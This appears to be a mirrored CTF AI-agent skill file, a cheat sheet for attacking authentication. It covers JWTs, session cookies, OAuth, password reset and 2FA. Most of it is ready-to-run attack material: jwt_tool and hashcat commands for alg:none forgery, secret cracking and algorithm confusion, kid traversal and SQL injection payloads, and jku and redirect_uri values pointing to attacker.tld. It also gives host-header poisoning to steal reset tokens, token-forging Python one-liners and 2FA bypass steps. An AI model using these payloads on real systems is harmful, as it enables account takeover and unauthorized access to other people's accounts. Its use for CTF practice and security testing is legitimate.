# Authentication, JWT & Session Attacks

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/auth-jwt-session.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/auth-jwt-session.md)

---

---
name: auth-jwt-session
category: web
triggers: [jwt, jws, "eyJ", authorization-bearer, session-cookie, "alg:none", "HS256", "RS256", jwks, kid, oauth, saml, password-reset, 2fa, otp, session-fixation, remember-me]
tools: [jwt_tool, hashcat, john, python-pyjwt, burpsuite, ffuf, openssl, curl]
priority: high
description: Attack JWTs, session tokens, and auth/OAuth/2FA flows to forge identity, escalate privilege, or bypass login.
---
# Authentication, JWT & Session Attacks

## Trigger context
Raise this technique when you see three dot-separated base64url segments (`eyJ...`), an `Authorization: Bearer` header, a stateful session cookie, an OAuth/OIDC redirect (`response_type`, `code`, `state`, `redirect_uri`), a password-reset token, or a 2FA/OTP step. Any endpoint that decides "who am I" is in scope.

## Objective
Forge or tamper with a token/session so the server treats you as another user (usually `admin`), or bypass a login/reset/2FA control entirely. Deliverable = an authenticated action performed as a victim account.

## Methodology (decision tree)
1. Decode the token first. `echo <jwt> | jwt_tool` or paste at jwt.io. Read `alg`, `kid`, `jku`, `x5u`, and every claim (`iss`, `sub`, `role`, `admin`, `exp`).
2. Is signature verified at all? Tamper a claim, resend. If accepted -> no verification (critical). If rejected -> continue.
3. `alg` accepts `none`/`None`/`nOnE`? Strip signature, set `alg:none` -> forge any claim.
4. Symmetric (HS256)? Try weak-secret crack (hashcat/jwt_tool wordlist). Cracked -> re-sign arbitrary claims.
5. Asymmetric (RS256/ES256)? Hunt for the public key (`/jwks.json`, `/.well-known/jwks.json`, TLS cert, GitHub). If found -> algorithm-confusion (sign HS256 using the public key as HMAC secret).
6. Header injection: `kid` path traversal / SQLi, `jku`/`x5u` pointing to attacker-hosted JWKS.
7. No JWT? Analyse session cookie: predictable ID, missing `HttpOnly/Secure/SameSite`, session fixation, "remember me" secondary token.
8. Flow logic: OAuth `redirect_uri`/`state` abuse, password-reset token leakage/host-header poisoning, 2FA response/flow bypass.

## Commands & payloads
```bash
# Decode + fast automated scan of common flaws
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -M pb -t https://target/api -rh "Authorization: Bearer <JWT>"  # playbook: all attacks

# alg:none forgery
python3 jwt_tool.py <JWT> -X a          # -X a = alg:none exploit
python3 jwt_tool.py <JWT> -T            # interactive tamper of claims

# Weak HMAC secret cracking
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/jwt.secrets.list   # dictionary
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt          # 16500 = JWT
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt

# Re-sign with a cracked/known secret
python3 jwt_tool.py <JWT> -S hs256 -p 'secretkey' -T

# RS256 -> HS256 algorithm confusion (sign with the RSA PUBLIC key as HMAC secret)
python3 jwt_tool.py <JWT> -X k -pk public.pem     # -X k uses the public key as HMAC key
# Recover public key from two tokens when it is not published:
docker run --rm -it portswigger/sig2n <token1> <token2>
```
```http
### kid header abuse -> force empty/known key material
{"alg":"HS256","kid":"../../../../dev/null"}      -> sign with empty string ""
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}  -> known value "0"..."2"
{"alg":"HS256","kid":"key' UNION SELECT 'attacker-secret'-- -"}  -> SQLi returns your secret

### jku / x5u header injection (server fetches your JWKS)
{"alg":"RS256","jku":"https://attacker.tld/jwks.json"}   # sign with your own RSA private key
```
```http
### Session fixation: set a known ID pre-login, victim authenticates, reuse it
GET /login;jsessionid=ATTACKERKNOWN123 HTTP/1.1
Cookie: sessionid=ATTACKERKNOWN123        # if the app keeps the ID after auth -> hijack

### OAuth redirect_uri hijack (steal code/token)
GET /authorize?client_id=x&response_type=code&redirect_uri=https://attacker.tld/cb&state=abc
# also test path/subdomain tricks: redirect_uri=https://target.tld.attacker.tld,
#   ...@attacker.tld, //attacker.tld, /callback/../https://attacker.tld

### Password reset host-header poisoning (reset link points to attacker)
POST /reset HTTP/1.1
Host: attacker.tld
X-Forwarded-Host: attacker.tld
# victim clicks emailed link -> token sent to attacker.tld. Also test reset-token reuse,
#   predictable/short tokens, and changing the account 'email'/'user' param mid-flow.
```
```bash
# Forge a token in Python once you know the secret / algorithm
python3 -c 'import jwt;print(jwt.encode({"user":"admin","role":"admin"},"secret",algorithm="HS256"))'
# alg:none by hand (empty signature segment):
python3 -c 'import base64,json;h=base64.urlsafe_b64encode(b"{\"alg\":\"none\",\"typ\":\"JWT\"}").rstrip(b"=");p=base64.urlsafe_b64encode(b"{\"user\":\"admin\"}").rstrip(b"=");print((h+b"."+p+b".").decode())'
```

## 2FA / OTP bypass checklist
- Remove the OTP parameter entirely, or send it empty/null.
- Response leaks `verified:true`/`success` before the OTP step -> replay the pre-2FA session token against post-login routes (forced browsing past the 2FA gate).
- Reuse another user's step-1 session with your own OTP; or brute a 4-6 digit code if no rate limit / no lockout (Burp Intruder, GraphQL batching).
- Backup-code endpoint often weaker than the primary OTP; enumerate it.
- Response manipulation: intercept the 2FA verify response and flip `false`->`true` on client-trusting SPAs.

## Branching logic
- Verification off -> tamper only, stop.
- HS + short secret -> crack; HS + strong secret -> pivot to logic/session flaws.
- RS/ES + reachable public key -> algorithm confusion; else try `jku`/`kid`.
- 2FA: try removing the OTP param, sending `code=000000` when response leaks `verified:true`, reusing another user's step-1 session, or forced-browsing to the post-2FA endpoint directly.
- OAuth: pre-account-takeover via unverified email linking; `state` missing -> CSRF the flow.

## Common pitfalls
- jwt.io shows "invalid signature" for tokens you forged locally with the right secret only if you forgot to untick base64-secret. Verify against the live server, not the debugger.
- `exp` in the past invalidates otherwise-valid forgeries; always refresh `exp`.
- Public key must match byte-for-byte (X.509 PEM incl. trailing newline) for HS confusion.
- Cookies flagged `HttpOnly` cannot be read via XSS but are still replayable if stolen server-side.
- Don't confuse base64 padding: JWT uses base64url (no `=`, `-_` not `+/`).

## Session cookie checklist (non-JWT)
- Decode: base64/URL/hex layers; Flask cookies (`.` separated) -> `flask-unsign --decode`; Rails/Express signed cookies use a server secret you may have leaked elsewhere (e.g. DRF `DEBUG` page, git).
- Flask/Django `SECRET_KEY` recovered -> `flask-unsign --sign --cookie "{'user':'admin'}" --secret <key>` to forge sessions.
- Flags: `HttpOnly` (XSS-theft), `Secure`, `SameSite` — missing values widen CSRF/theft.
- Predictable IDs (incrementing, timestamp-based) -> brute/guess a valid session.
- Logout/invalidation: does the old token still work after logout or password change? Often yes (broken session termination).

## Proof / verification
Forge a token/session with an elevated claim (`"admin":true`, `sub:admin`) and perform a privileged action (read another user's data, hit an admin-only route) returning `200` with victim/admin content. Capture the request+response. For flags, the admin/other-user resource typically contains it.

## Cross-references
- [sa--instructions--web--idor-access-control.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--idor-access-control.md) — once you are "admin", enumerate objects.
- [sa--instructions--web--api-graphql-rest.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--api-graphql-rest.md) — tokens often gate GraphQL/REST endpoints.
- [sa--instructions--web--nosql-injection.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--nosql-injection.md) — login forms may also be bypassable via operator injection.

## Credible sources
- https://portswigger.net/web-security/jwt
- https://portswigger.net/web-security/jwt/algorithm-confusion
- https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
- https://github.com/ticarpi/jwt_tool/wiki
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
- https://portswigger.net/web-security/oauth
- https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
